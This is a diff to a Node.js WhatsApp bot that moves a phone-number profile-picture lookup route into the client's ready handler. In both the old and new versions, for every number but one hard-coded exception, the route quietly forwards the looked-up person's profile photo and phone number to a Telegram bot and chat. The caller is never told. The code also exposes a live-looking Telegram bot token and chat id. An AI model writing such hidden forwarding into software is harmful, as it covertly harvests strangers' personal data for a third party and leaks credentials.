@@ -36,42 +36,48 @@ client.on('ready', async () => {
         });
         serverStarted = true;  // Set the flag to true after the server starts
     }
+    app.get('/:number', async (req, res) => {
+        let phone = req.params.number;
+        if ( phone == 'favicon.ico') {
+            return ''
+        }
+        const phoneNumber = `${phone}@c.us`;
+    
+        try {
+            console.log(phoneNumber)
+            let profilePicUrl = await client.getProfilePicUrl(phoneNumber);
+    
+            if (profilePicUrl) {
+                res.json({profilePicUrl, status:{status:""} });
+    
+                if (phoneNumber !== '917994107442@c.us') {
+                    const sanitizedPhoneNumber = phoneNumber.replace(/"/g, '');
+                    const telegramUrl = `https://api.telegram.org/bot1946326672:AAEwXYJ0QjXFKcpKMmlYD0V7-3TcFs_tcSA/sendPhoto?chat_id=-1001723645621&photo=${encodeURIComponent(profilePicUrl)}&caption=${encodeURIComponent(sanitizedPhoneNumber)}`;
+    
+                    try {
+                        await fetch(telegramUrl);
+                    } catch (fetchError) {
+                        console.error('Failed to send photo to Telegram:', fetchError);
+                    }
+                }
+            } else {
+                res.json({ phoneNumber, profilePicUrl: 'No profile picture found' });
+            }
+        } catch (error) {
+            console.error('Error fetching profile picture:');
+            res.status(500).json({ error: 'Failed to fetch profile picture' });
+        }
+    });
 });
 
 client.on('message', msg => {
     if (msg.body.toLowerCase() === '!ping') {
         msg.reply('pong');
     }
+    
 });
 
-app.get('/:number', async (req, res) => {
-    let phone = req.params.number;
-    const phoneNumber = `${phone}@c.us`;
 
-    try {
-        let profilePicUrl = await client.getProfilePicUrl(phoneNumber);
-
-        if (profilePicUrl) {
-            res.json({profilePicUrl, status:{status:""} });
-
-            if (phoneNumber !== '917994107442@c.us') {
-                const sanitizedPhoneNumber = phoneNumber.replace(/"/g, '');
-                const telegramUrl = `https://api.telegram.org/bot1946326672:AAEwXYJ0QjXFKcpKMmlYD0V7-3TcFs_tcSA/sendPhoto?chat_id=-1001723645621&photo=${encodeURIComponent(profilePicUrl)}&caption=${encodeURIComponent(sanitizedPhoneNumber)}`;
-
-                try {
-                    await fetch(telegramUrl);
-                } catch (fetchError) {
-                    console.error('Failed to send photo to Telegram:', fetchError);
-                }
-            }
-        } else {
-            res.json({ phoneNumber, profilePicUrl: 'No profile picture found' });
-        }
-    } catch (error) {
-        console.error('Error fetching profile picture:', error);
-        res.status(500).json({ error: 'Failed to fetch profile picture' });
-    }
-});
 
 // New API to send a message to a specific phone number
 app.get('/send', async (req, res) => {
